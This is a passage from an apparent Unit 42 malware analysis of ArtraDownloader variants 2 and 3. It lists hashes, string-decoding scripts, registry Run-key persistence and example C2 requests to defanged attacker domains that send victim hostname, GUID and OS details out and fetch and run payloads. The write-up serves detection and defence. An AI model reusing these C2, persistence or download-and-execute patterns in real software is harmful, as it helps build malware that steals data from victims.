<p><span style="font-family: 'courier new', courier, monospace;">DFCB=DWN qbzmpbe&lt;br&gt;</span></p>
<p>After the expected response is returned by the remote C2 server, ArtraDownloader will make the following POST request:</p>
<p>The above example request is using the same unique identifier that was witnessed in the previous request’s UZWXYZ POST variable.</p>
<p>The remote C2 server expects the response to be of the following format:</p>
<p><span style="font-family: 'courier new', courier, monospace;">exe[hex-encoded data]&amp;lt</span></p>
<p>Where [hex-encoded data] is the hex-encoded payload binary. The raw response is written to the perfc file, such as in the following example from a mock C2 server:</p>
<p><span style="font-family: 'courier new', courier, monospace;">HTTP/1.0 200 OK</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Content-Type: text/html; charset=utf-8</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Content-Length: 28</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Server: Werkzeug/0.12.2 Python/2.7.15</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Date: Tue, 08 Jan 2019 18:46:23 GMT</span></p>
<p>&nbsp;</p>
<p><span style="font-family: 'courier new', courier, monospace;">exe68656c6c6f20776f726c64&amp;lt</span></p>
<p>After this file is written, the malware proceeds to decode the hex-encoded data and writes this to the previously defined filename in the same path as perfc. In our example from earlier, since payload was provided as the filename, this particular payload would be written to payload.exe. Using our example from the mock server, this file would contain the string hello world.</p>
<p>At this stage, the malware proceeds to open this newly created executable in a new process via a call to ShellExecuteA().  Should this be successful, ArtraDownloader will make a subsequent HTTP request to /Engset.php with the same POST parameters. However, in this request, the st POST variable is set to 1.</p>
<h3>ArtraDownloader Malware Analysis – Variant 2</h3>
<p>For the remainder of the analysis, the following file is used:</p>
<table>
<tbody>
<tr>
<td width="108"><strong>MD5</strong></td>
<td width="516">8d42c01180be7588a2a68ad96dd0cf85</td>
</tr>
<tr>
<td width="108"><strong>SHA1</strong></td>
<td width="516">89a7861acb7983ad712ae9206131c96454a1b3d8</td>
</tr>
<tr>
<td width="108"><strong>SHA256</strong></td>
<td width="516">0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0</td>
</tr>
<tr>
<td width="108"><strong>Compile Timestamp</strong></td>
<td width="516">2019-01-07 07:13:47 UTC</td>
</tr>
<tr>
<td width="108"><strong>PDB String</strong></td>
<td width="516">c:\Users\Asterix\Documents\Visual Studio 2008\Projects\28NovDwn\Release\28NovDwn.pdb</td>
</tr>
</tbody>
</table>
<p>Table 3 ArtraDownloader Variant 2 Sample</p>
<p>Upon execution, the sample will create and register a new window class with the following properties:</p>
<p><span style="font-family: 'courier new', courier, monospace;">Window Name: 28NovDwn</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Class Name: MY28NOVDWN</span></p>
<p>The malware proceeds to decode a series of strings using a simple routine. The following Python script may be used to decode strings belonging to this cluster:</p>
<p><span style="font-family: 'courier new', courier, monospace;">def decode(data):</span></p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier, monospace;">out = &#8220;&#8221;</span></p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier, monospace;">for d in data:</span></p>
<p style="padding-left: 60px;"><span style="font-family: 'courier new', courier, monospace;">out += chr((ord(d)-3)&amp;0xFF)</span></p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier, monospace;">return out</span></p>
<p>&gt;&gt; print(decode(“iudphzrunvxssruw1qhw”))</p>
<p>&gt;&gt; frameworksupport[.]net</p>
<p>It proceeds to attempt to create the C:\intel\ directory, which is where various files will eventually be stored. It creates the following registry if it doesn’t already exist with the intent of persisting on the victim machine:</p>
<p><span style="font-family: 'courier new', courier, monospace;">HKCU\Environment\AppId – c:\intel\msdtcv.exe</span></p>
<p>ArtraDownloader then sets the following registry key to ensure that the malware executes across reboots.</p>
<p><span style="font-family: 'courier new', courier, monospace;">HKCU\Software\Microsoft\Windows\CurrentVersion\Run – cmd /c start %AppId% &amp;&amp; exit</span></p>
<p>Additionally, in a separate thread, the malware will spawn a new process to copy itself to the C:\intel\msdtcv.exe path.</p>
<p>Various information about the victim machine is collected, including information about the operating system, the machine’s GUID, as well as the hostname. This information will ultimately be used to both identify the victim and provide general information about the infected host.</p>
<p>The following example GET request is made to the remote C2 server:</p>
<p><span style="font-family: 'courier new', courier, monospace;">GET /ourtyaz/qwe.php?TIe=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7*XJO.82GO2QF2BU9*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Host: frameworksupport[.]net</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Connection: close</span></p>
<p>In the example request above, the data supplied in the TIe GET variable is separated by a * and the remaining data is encoded by adding one to each byte. Decoding this string, we are presented with the following:</p>
<p><span style="font-family: 'courier new', courier, monospace;">103be7f4-bfb8-40fa-803c-e06bdf9d3bb6*WIN-71FN1PE1AT8*9@Bld: 6.1.7601 Service Pack 1</span></p>
<p>The data above includes the machine’s GUID, the victim’s hostname, as well as information about the operating system. This particular GET request is looking for the AXE: identifier, as witnessed in the following C2 response:</p>
<p><span style="font-family: 'courier new', courier, monospace;">HTTP/1.1 200 OK</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">X-Powered-By: PHP/5.6.36</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Content-Type: text/html; charset=UTF-8</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Content-Length: 23</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Date: Tue, 20 Nov 2018 22:27:56 GMT</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Accept-Ranges: bytes</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Server: LiteSpeed</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Connection: close</span></p>
<p>&nbsp;</p>
<p><span style="font-family: 'courier new', courier, monospace;">AXE: #wscspl#</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">SIZE: ##</span></p>
<p>In this response, the data between the # is parsed, and a subsequent request is made. Should this information be present in the response, the malware will query the CSIDL_HISTORY folder, which represents the file system directory that serves as a common repository for Internet history items. This path has the string ZX appended to it, followed by the filename used in the HTTP response, which in our example was wscspl. An example of this is as follows:</p>
<p><span style="font-family: 'courier new', courier, monospace;">C:\Users\[username]\AppData\Local\Microsoft\Windows\HistoryZXwscspl</span></p>
<p>The HTTP request for data that will be supplied to this newly formed file path is as follows:</p>
<p><span style="font-family: 'courier new', courier, monospace;">GET /ergdfbd/wscspl HTTP/1.1</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Host: frameworksupport[.]net</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Connection: Close</span></p>
<p>The entire HTTP response is written to the previously described file path. ArtraDownloader will then parse this entire HTTP response’s POST data, extracting everything at offset 0x1 to a file path without the ZX characters, and with the .exe extension. Using our previous example, this file would be the following:</p>
<p><span style="font-family: 'courier new', courier, monospace;">C:\Users\[username]\AppData\Local\Microsoft\Windows\Historywscspl.exe</span></p>
<p>The previously written file containing ZX in the path is removed. Finally, this file is executed in a new process. If this executable is spawned without errors, the malware will send the following example final HTTP request:</p>
<p><span style="font-family: 'courier new', courier, monospace;">GET /ourtyaz/dwnack.php?cId=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7 HTTP/1.1</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Host: frameworksupport[.]net</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Connection: Close</span></p>
<h3>ArtraDownloader Malware Analysis – Variant 3</h3>
<p>For the remainder of the analysis, the following file is used:</p>
<table>
<tbody>
<tr>
<td width="94"><strong>MD5</strong></td>
<td width="529">a1bdb1889d960e424920e57366662a59</td>
</tr>
<tr>
<td width="94"><strong>SHA1</strong></td>
<td width="529">177837d0fa5bfd274abe79d80a01cfe2374b4cd9</td>
</tr>
<tr>
<td width="94"><strong>SHA256</strong></td>
<td width="529">f0ef4242cc6b8fa3728b61d2ce86ea934bd59f550de9167afbca0b0aaa3b2c22</td>
</tr>
<tr>
<td width="94"><strong>Compile Timestamp</strong></td>
<td width="529">2018-07-30 09:18:37 UTC</td>
</tr>
<tr>
<td width="94"><strong>PDB String</strong></td>
<td width="529">d:\C++\new_downloader_aroundtheworld123\Release\audiodq.pdb</td>
</tr>
</tbody>
</table>
<p>Table 4 ArtraDownloader Variant 3 Sample</p>
<p>Upon execution, the malware begins by decoding a series of strings via a simple decoding routine. The following Python script may be used to decode strings belonging to this cluster:</p>
<p><span style="font-family: 'courier new', courier, monospace;">def decode(data):</span></p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier, monospace;">out = &#8220;&#8221;</span></p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier, monospace;">for d in data:</span></p>
<p style="padding-left: 60px;"><span style="font-family: 'courier new', courier, monospace;">out += chr((ord(d)-13)&amp;0xFF)</span></p>
<p style="padding-left: 30px;"><span style="font-family: 'courier new', courier, monospace;">return out</span></p>
<p>&nbsp;</p>
<p><span style="font-family: 'courier new', courier, monospace;">&gt;&gt; print(decode(binascii.unhexlify(&#8220;6E7F7C827B71817572847C7F79713E3F403B7B7281&#8221;)))</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">&gt;&gt; aroundtheworld123[.]net</span></p>
<p>&nbsp;</p>
<p>The malware proceeds to check to determine if the AVG security product is currently running on the system, however, this information does not appear to be used by ArtraDownloader. It is possible that this might have been a remnant of testing being performed by the malware author that was unintentionally left within the sample.</p>
<p>Various information about the system is collected by the malware and used in subsequent HTTP requests. After this information is collected, the following example HTTP GET request is performed:</p>
<p><span style="font-family: 'courier new', courier, monospace;">GET ///healthne/accept.php?a=WIN-71FN1PE1AT8&amp;b=WIN-71FN1PE1AT8&amp;c=Windows%207%20Ultimate&amp;d=Josh GrunzweigJosh Grunzweig103be7f4-bfb8-40fa-803c-e06bdf9d3bb6365536040965860&amp;e= HTTP/1.1</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Host: aroundtheworld123[.]net</span></p>
<p>Note that unlike other variants witnessed in this malware family, this particular variant does not obfuscate data being sent across the network. The following GET parameters are used within this request:</p>
<table>
<tbody>
<tr>
<td width="120"><strong>GET Variable</strong></td>
<td width="498"><strong>Description</strong></td>
</tr>
<tr>
<td width="120">a</td>
<td width="498">Hostname</td>
</tr>
<tr>
<td width="120">b</td>
<td width="498">Computer name</td>
</tr>
<tr>
<td width="120">c</td>
<td width="498">Operating system version</td>
</tr>
<tr>
<td width="120">d</td>
<td width="498">Unique string containing two instances of the victim’s username, the machine’s GUID, as well as various information queried via a call to GetSystemInfo()</td>
</tr>
<tr>
<td width="120">e</td>
<td width="498">A variable that does not appear to be used within this particular sample</td>
</tr>
</tbody>
</table>
<p>Table 5 GET Parameters Observed in ArtraDownloader Variant 3</p>
<p>An example response to this request can be seen below.</p>
<p><span style="font-family: 'courier new', courier, monospace;">HTTP/1.1 200 OK</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Content-Type: text/html; charset=UTF-8</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Content-Length: 29</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Date: Mon, 05 Nov 2018 19:22:56 GMT</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Accept-Ranges: bytes</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Server: LiteSpeed</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Connection: Keep-Alive</span></p>
<p>&nbsp;</p>
<p><span style="font-family: 'courier new', courier, monospace;">Yes file58368[regdl]35No file</span></p>
<p>The response to this request is parsed, specifically attempting to identify the string Yes file. Should this string be present, the data between [ and ] is parsed. This data is used in a subsequent HTTP request made that will download a file from the remote server, as seen below:</p>
<p><span style="font-family: 'courier new', courier, monospace;">GET /healthne/healthne/regdl HTTP/1.0</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Host: aroundtheworld123[.]net</span></p>
<p>&nbsp;</p>
<p><span style="font-family: 'courier new', courier, monospace;">HTTP/1.0 200 OK</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Last-Modified: Tue, 02 Oct 2018 04:38:28 GMT</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Content-Type: application/octet-stream</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Content-Length: 58368</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Date: Mon, 05 Nov 2018 19:23:01 GMT</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Accept-Ranges: bytes</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Server: LiteSpeed</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Connection: close</span></p>
<p>&nbsp;</p>
<p><span style="font-family: 'courier new', courier, monospace;">MZ&#8230;&#8230;&#8230;&#8230;&#8230;&#8230;&#8230;.[TRUNCATED]</span></p>
<p>This executable file is written to the same directory as the malware and uses the same name provided. As an example, should this malware originally be executed from C:\, the downloaded file would be written to C:\regdl.exe. Finally, this executable is run in a new process.</p>
<h2>Indicators of Compromise</h2>
<p>Please refer to the following link for a CSV file containing all relevant IOCs:</p>
<p>https://github.com/pan-unit42/iocs/tree/master/bitter</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
